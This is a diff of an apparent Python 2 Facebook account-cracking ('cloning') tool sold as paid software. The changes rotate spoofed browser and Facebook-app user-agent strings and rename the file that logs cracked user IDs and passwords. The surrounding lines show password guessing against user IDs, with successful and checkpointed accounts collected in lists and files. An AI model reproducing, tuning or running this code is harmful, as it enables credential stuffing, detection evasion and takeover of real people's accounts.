@@ -41,10 +41,10 @@ try:
 except:
     os.system('pip2 install lolcat')
 
-logo = "'\x1b[1;92m'    .--.  .-.   .-.  \n'\x1b[1;92m'   / {} \ } |   { |  \n'\x1b[1;91m' /  /\  \} '--.| } \n'\x1b[1;97m' /  /\  \} '--.| } \n'\x1b[1;93m' /  /\  \} '--.| } \n'\x1b[1;94m' `-'  `-'`----'`-'  \n\n'\x1b[1;91m'   Author :  Ali (Ar)  \n'\x1b[1;92m'   Wp  : 03047269778  \n'\x1b[1;93m'   Tool Type   :  Paid\n'\x1b[1;94m'   Lets   :     Enjoy\n'\x1b[1;96m'  Don,t   :   Feel       \n"
+logo = "'\x1b[1;92m'    .--.  .-.   .-.  \n'\x1b[1;92m'  / {} \ } |   { |  \n'\x1b[1;91m' /  /\  \} '--.| } \n'\x1b[1;97m' /  /\  \} '--.| } \n'\x1b[1;93m' /  /\  \} '--.| } \n'\x1b[1;94m' `-'  `-'`----'`-'  \n\n'\x1b[1;91m'   Author :  Ali (Ar)  \n'\x1b[1;92m'   Wp  : 03047269778  \n'\x1b[1;93m'   Tool Type   :  Paid\n'\x1b[1;94m'   Lets   :     Enjoy\n'\x1b[1;96m'  Don,t   :   Feel       \n"
 dec = '2'
 server = '2'
-rsauser = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
+rsauser = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Safari/605.1.15;]'
 header = {
     'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
     'x-fb-sim-hni': str(random.randint(20000, 40000)),
@@ -268,8 +268,8 @@ def numcloning():
         user = arg
         lines = random.choice([
             'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
-            'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]',
-            'Mozilla/5.0 (Linux; Android 11; SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
+            'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36;]',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36',
             'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'])
         
         try:
@@ -1099,7 +1099,7 @@ def xokpauto():
             pass
 
         myagents = random.choice([
-            'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.119 YaBrowser/22.3.0.2430 Yowser/2.5 Safari/537.36',
             'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko',
             'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; NP06; rv:11.0) like Gecko',
             'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
@@ -5102,7 +5102,7 @@ def f_p_pass():
                                     oks.append(uid + pass6)
                                 elif 'checkpoint' in rana.cookies.get_dict().keys():
                                     print '\x1b[1;91m[AR-CP] ' + uid + ' | ' + pass6
-                                    cp = open('AR-cp.txt', 'a')
+                                    cp = open('AR1-cp.txt', 'a')
                                     cp.write(uid + ' | ' + pass6 + '\n')
                                     cp.close()
                                     cps.append(uid + pass6)
